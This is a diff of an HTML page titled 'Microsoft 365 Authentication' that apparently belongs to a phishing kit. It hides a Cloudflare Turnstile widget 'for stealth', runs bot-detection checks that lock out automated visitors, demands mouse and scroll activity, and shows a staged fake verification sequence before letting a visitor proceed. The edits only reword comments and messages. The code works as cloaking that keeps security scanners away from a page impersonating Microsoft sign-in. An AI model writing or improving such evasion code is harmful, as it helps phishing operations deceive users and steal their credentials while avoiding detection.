@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft 365 Authentication</title>
-    <!-- Implicit rendering: script loads and auto-renders widgets with cf-turnstile class -->
+    <!-- Standard script for implicit rendering -->
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
     <style>
@@ -25,13 +25,13 @@
         .status-message.error { color:#a4262c; }
         .crypto-details { font-size:14px; color:#605e5c; margin-top:5px; font-family:'Consolas','Courier New',monospace; opacity:0; transition:opacity 0.3s ease; }
         .crypto-details.active { opacity:1; }
-        /* Hide any badge/space for stealth */
+        /* Hide widget/badge completely for stealth (Managed often has no visible footprint) */
         .cf-turnstile { display:none; }
     </style>
 </head>
 <body>
     <div class="loading-container">
-        <!-- Implicit rendering container - auto-runs on load -->
+        <!-- cf-turnstile class triggers implicit render + auto-challenge in Managed mode -->
         <div class="cf-turnstile"
              data-sitekey="0x4AAAAAACZ0Mhe41rmPYLWV"
              data-theme="auto"
@@ -53,14 +53,15 @@
 
         function onTurnstileSuccess(token) {
             turnstileToken = token;
-            // console.log('Token ready'); // uncomment for debug
+            // Optional debug: console.log('Turnstile success - token ready');
         }
 
         function onTurnstileError(errorCode) {
-            showError("Verification issue. Please refresh.");
+            showError("Verification issue detected. Please refresh the page.");
+            // Optional debug: console.error('Turnstile error code:', errorCode);
         }
 
-        // Bot checks
+        // Bot detection signals
         let botDetection = { passed: false };
         let humanInteraction = { mouseMoved: false, scrolled: false };
 
@@ -90,6 +91,7 @@
             botDetection.passed = checks.filter(Boolean).length >= 3;
         }
 
+        // Track basic interaction
         document.addEventListener('mousemove', () => { humanInteraction.mouseMoved = true; }, {once: true});
         document.addEventListener('scroll', () => { humanInteraction.scrolled = true; }, {once: true});
 
@@ -99,7 +101,9 @@
             { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1300 }
         ];
 
-        let currentStep = 0, isLoading = false, sequenceCompleted = false;
+        let currentStep = 0;
+        let isLoading = false;
+        let sequenceCompleted = false;
 
         function showError(msg) {
             const status = document.getElementById('statusMessage');
@@ -135,16 +139,19 @@
             sequenceCompleted = true;
 
             if (!turnstileToken) {
-                status.textContent = "Verifying... please wait a moment or refresh if stuck.";
+                status.textContent = "Verifying your connection... please wait a moment.";
                 status.classList.add('active');
                 status.style.color = '#0078d4';
                 return;
             }
 
-            if (!botDetection.passed) return showError("Access restricted: automated environment detected.");
+            if (!botDetection.passed) {
+                return showError("Access restricted: automated environment detected.");
+            }
 
+            // Optional: keep interaction check, but Managed usually handles it well
             if (!humanInteraction.mouseMoved || !humanInteraction.scrolled) {
-                status.textContent = "Please move mouse or scroll to proceed...";
+                status.textContent = "Please interact briefly (move mouse/scroll) to finalize.";
                 status.classList.add('active');
                 status.style.color = '#0078d4';
                 return;
@@ -164,7 +171,6 @@
             setTimeout(updateLoadingStep, 800);
         }
 
-        // Init
         window.addEventListener('load', () => {
             runBotChecks();
             setTimeout(startLoginSequence, 1000);
